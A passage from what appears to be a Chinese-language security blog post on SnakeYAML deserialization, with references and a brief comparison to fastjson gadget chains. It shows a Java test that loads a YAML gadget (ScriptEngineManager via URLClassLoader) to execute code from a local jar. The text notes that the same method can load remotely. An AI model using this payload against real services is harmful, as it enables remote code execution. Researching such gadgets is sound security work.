生成了yaml.jar，接下来就是我们最开始的反序列化洞了，URLClassLoader不仅可以远程加载，也可以直接用file://加载本地的jar包

```
package Snake;

import org.yaml.snakeyaml.Yaml;

public class snaketest {
    public static void main(String[] args) {
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"file:./yaml.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }

}
```

因为我用的windows，我试了一下要直接`file:`这样来加载，不过在linux下还是得file://

![image-20220802095907733](images/41.png)



# 写在最后

其实SnakeYaml和fastjson感觉有很多通用的点，都是去调对应的setter方法，我试了几条fastjson的链子，都基本上是能通的，又去想过用fastjson加载恶意类的方式去试试，但是发现那个是调用的getter方法





参考链接

https://www.cnblogs.com/nice0e3/p/14514882.html

https://www.cnblogs.com/CoLo/p/16225141.html

https://xz.aliyun.com/t/10655
